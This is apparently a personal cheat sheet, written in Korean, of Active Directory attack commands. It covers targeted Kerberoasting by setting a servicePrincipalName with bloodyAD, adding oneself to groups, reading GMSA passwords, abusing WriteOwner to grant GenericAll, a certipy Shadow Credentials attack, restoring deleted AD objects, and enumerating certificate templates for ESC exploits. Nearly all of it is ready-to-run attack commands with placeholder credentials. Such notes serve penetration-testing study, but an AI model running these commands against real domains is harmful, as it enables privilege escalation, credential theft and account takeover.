Rusthound가 nxc 더 나음? 아마 나을 듯. 결과 다름.  

Targeted Kerberoast Attact (writeSPN 권한 필요)
- 1. bloodyad -u username -p password --host dc_ip set object target_username servicePrincipalName -v 'http/pwned' : set
- 2. bloodyad -u username -p password --host dc_ip set object target_username servicePrincipalName : unset
- 3. nxc 이용해 kerberoasting 으로 티켓 추출
- 또는 targetedkerberoast.py 사용해도 됨.

addself(Group)
- bloodyAD --host dc_ip -u username -p password add groupMember group_name user_name

ReadGMSA 권한
- nxc ldap 으로 --gmsa 옵션 사용

WriteOwner
- bloodyAD --host dc_ip -u username -p password set owner who_has_an_ownership_to this_user
- bloodyAD --host dc_ip -u username -p password add genericAll who_has_an_permission_to this_user
- Shadow Credentials attack: certipy shadow auto -u username@domain -p password -account target -dc-ip dc_ip
- 또는 패스워드 변경으로도 가능함.

Certificate 관련해 bloodhound cypher 에서 sid로 표시된 그룹이 가지고 있는 certificate 확인. 문제점이 있음? 지워진 것들임.
- Get-ADObject -Filter 'objectsid -eq "sid" -Properties * -IncludeDeletedObjects
- Get-ADObject -Filter "ObjectSID -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111'" -Properties * -IncludeDeletedObjects : 예시
- Restore-ADObject -Identity "Object GUID" : 조건이 해당 오브젝트 보유한 OU 권한 존재해야 함.

Certification 쪽
certifpy find -u user -p password -target ca_ip

certipy github wiki 보면 ESC 시리즈 익스플로잇 명령어 나옴
